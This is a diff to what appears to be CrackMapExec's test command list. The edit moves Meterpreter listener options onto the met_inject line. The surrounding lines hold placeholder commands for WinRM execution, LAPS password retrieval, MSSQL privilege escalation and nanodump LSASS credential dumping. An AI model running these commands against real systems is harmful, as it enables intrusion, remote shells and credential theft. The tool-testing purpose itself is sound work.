@@ -160,10 +160,10 @@ crackmapexec winrm TARGET -u USERNAME -p PASSWORD -X whoami
 crackmapexec winrm TARGET -u USERNAME -p PASSWORD --laps
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD
 # crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M empire_exec
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M met_inject
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M met_inject --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M mssql_priv
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M mssql_priv --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M mssql_priv -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M nanodump
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M nanodump --options
 crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M test_connection --options
